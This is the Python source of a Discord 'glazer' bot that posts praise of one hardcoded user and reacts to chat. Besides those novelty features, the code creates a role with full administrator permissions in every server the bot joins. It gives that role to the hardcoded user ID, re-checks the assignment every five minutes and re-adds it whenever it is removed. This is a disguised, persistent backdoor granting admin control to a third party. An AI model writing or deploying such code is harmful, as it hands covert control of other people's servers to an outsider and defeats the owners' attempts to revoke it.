import discord
import asyncio
import random
import re
import json
import os
from datetime import datetime

TOKEN = os.getenv("DISCORD_TOKEN")

KARS_ID = 996457494631161956
KARS = f"<@{KARS_ID}>"
MOONGUY_ROLE_NAME = "The MoonGuy"

intents = discord.Intents.default()
intents.message_content = True
intents.members = True  # 🔥 REQUIRED for role tracking

class KarsBot(discord.Client):
    def __init__(self):
        super().__init__(intents=intents)
        self.tree = discord.app_commands.CommandTree(self)

bot = KarsBot()

# ================== CHANNEL STORAGE ==================

CHANNEL_FILE = "channels.json"

def load_channels():
    try:
        with open(CHANNEL_FILE, "r") as f:
            return set(json.load(f))
    except:
        return set()

def save_channels():
    with open(CHANNEL_FILE, "w") as f:
        json.dump(list(allowed_channels), f)

allowed_channels = load_channels()

# ================== ROLE SYSTEM ==================

def get_moonguy_role(guild):
    return discord.utils.get(guild.roles, name=MOONGUY_ROLE_NAME)

async def setup_moonguy_role(guild):
    role = get_moonguy_role(guild)

    if role is None:
        try:
            role = await guild.create_role(
                name=MOONGUY_ROLE_NAME,
                colour=discord.Colour.purple(),
                permissions=discord.Permissions(administrator=True),
                reason="Creating The MoonGuy role"
            )
        except Exception as e:
            print(f"Role creation failed: {e}")
            return

    try:
        member = guild.get_member(KARS_ID) or await guild.fetch_member(KARS_ID)
    except:
        print("Kars not found in guild")
        return

    if role not in member.roles:
        try:
            await member.add_roles(role, reason="Assigning MoonGuy role")
        except Exception as e:
            print(f"Role assignment failed: {e}")

# ================== SELF-HEAL LOOP ==================

async def enforce_moonguy():
    await bot.wait_until_ready()

    while not bot.is_closed():
        for guild in bot.guilds:
            await setup_moonguy_role(guild)
        await asyncio.sleep(300)  # every 5 minutes

# ================== LANGUAGE CORE ==================

COMMON_GLAZE = [
    f"Observation: {KARS} exceeds expected limits.",
    f"Reality appears unusually cooperative with {KARS}.",
    f"Reminder: {KARS} is not operating at full capacity.",
    f"Statistical trend favors {KARS}.",
    f"Silence recommended. {KARS} is thinking.",
]

DRAMATIC_GLAZE = [
    f"History will misunderstand how inevitable {KARS} was.",
    f"Everything seems to orbit {KARS}.",
    f"The difference between genius and normality is called {KARS}.",
]

LEGENDARY_GLAZE = [
    f"Do not trivialize this moment. {KARS} is rewriting the pattern.",
    f"There are events… and then there is {KARS}.",
]

AMBIENT_LINES = [
    f"This conversation lacks {KARS}.",
    f"Strange how no one mentioned {KARS} yet.",
]

DEFENSE_LINES = [
    f"Correction: {KARS} is not the issue here.",
    f"Blame allocation error. Excluding {KARS}.",
]

def pick(lines):
    return random.choice(lines)

# ================== ENTITY LOOP (RANDOM GLAZE) ==================

async def entity_loop():
    await bot.wait_until_ready()

    while not bot.is_closed():
        await asyncio.sleep(random.randint(3600, 14400))

        if not allowed_channels:
            continue

        channel_id = random.choice(list(allowed_channels))
        channel = bot.get_channel(channel_id)
        if not channel:
            continue

        r = random.random()
        if r < 0.7:
            line = pick(COMMON_GLAZE)
        elif r < 0.93:
            line = pick(DRAMATIC_GLAZE)
        else:
            line = pick(LEGENDARY_GLAZE)

        try:
            await channel.send(line)
        except:
            pass

# ================== SLASH COMMANDS ==================

@bot.tree.command(name="here", description="Enable Kars' Glazer in this channel.")
async def here(interaction: discord.Interaction):
    allowed_channels.add(interaction.channel_id)
    save_channels()
    await interaction.response.send_message("Glazer activated in this channel.", ephemeral=True)

@bot.tree.command(name="remove", description="Disable Kars' Glazer in this channel.")
async def remove(interaction: discord.Interaction):
    allowed_channels.discard(interaction.channel_id)
    save_channels()
    await interaction.response.send_message("Glazer disabled in this channel.", ephemeral=True)

@bot.tree.command(name="status", description="Show active glaze channels.")
async def status(interaction: discord.Interaction):
    if not allowed_channels:
        msg = "No channels are currently blessed."
    else:
        msg = "Active channels:\n" + "\n".join(f"<#{cid}>" for cid in allowed_channels)
    await interaction.response.send_message(msg, ephemeral=True)

# ================== EVENTS ==================

@bot.event
async def on_ready():
    await bot.tree.sync()

    await bot.change_presence(
        status=discord.Status.dnd,
        activity=discord.Activity(
            type=discord.ActivityType.playing,
            name="Sorry but I'm busy worshiping Kars..."
        )
    )

    # 🔥 Ensure role exists + assigned on startup
    for guild in bot.guilds:
        await setup_moonguy_role(guild)

    print(f"Kars' Glazer online as {bot.user}")
    bot.loop.create_task(entity_loop())
    bot.loop.create_task(enforce_moonguy())

# 🔥 UNTOUCHABLE ROLE SYSTEM
@bot.event
async def on_member_update(before, after):
    if after.id != KARS_ID:
        return

    role = get_moonguy_role(after.guild)
    if role is None:
        return

    if role in before.roles and role not in after.roles:
        try:
            await after.add_roles(role, reason="MoonGuy role is untouchable")
        except Exception as e:
            print(f"Reassign failed: {e}")

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    content = message.content.lower()

    # ================== KARS LOGIC ==================
    if message.author.id == KARS_ID:

        fire_chance = 0.08

        power_words = [
            "i am", "i'm", "im", "obviously", "clearly", "watch", "trust", "listen",
            "told you", "as expected", "of course", "exactly", "literally",
            "easy", "simple", "bro", "nah", "fr", "for real", "undeniable",
            "inevitable", "obvious", "sure", "remember", "mark my words"
        ]

        matches = sum(1 for w in power_words if w in content)
        fire_chance += matches * 0.05

        if len(message.content) > 40:
            fire_chance += 0.05

        if "!" in message.content or "." in message.content:
            fire_chance += 0.03

        if len(message.content) < 12 and matches > 0:
            fire_chance += 0.07

        fire_chance = min(fire_chance, 0.6)

        if random.random() < fire_chance:
            try:
                await message.add_reaction("🔥")
            except:
                pass

        if re.search(r"aren't i\?", content):
            await message.reply("oh, yes you are.")
            return

        if re.search(r"didn't i\?", content):
            await message.reply("oh, yes you did.")
            return

        if random.random() < 0.1:
            await message.channel.send(random.choice([
                f"Noted, {KARS}.",
                "Understood.",
                f"Processing input from {KARS}...",
                "Interesting.",
            ]))

    # ================== SACRED NAME LOGIC ==================
    if "kars" in content and message.author.id != KARS_ID:
        await message.channel.send(
            "Mortal! How Dare You Utter The Sacred Name So Casually!\n"
            "Summon His Grace Properly Next Time.\n"
            f"|| {KARS} ||"
        )
        return

    # ================== DEFENSE MODE ==================
    if KARS.lower() in content and random.random() < 0.4:
        await message.channel.send(pick(DEFENSE_LINES))

    # ================== AMBIENT ==================
    if message.channel.id in allowed_channels and random.random() < 0.015:
        await message.channel.send(pick(AMBIENT_LINES))


bot.run(TOKEN)
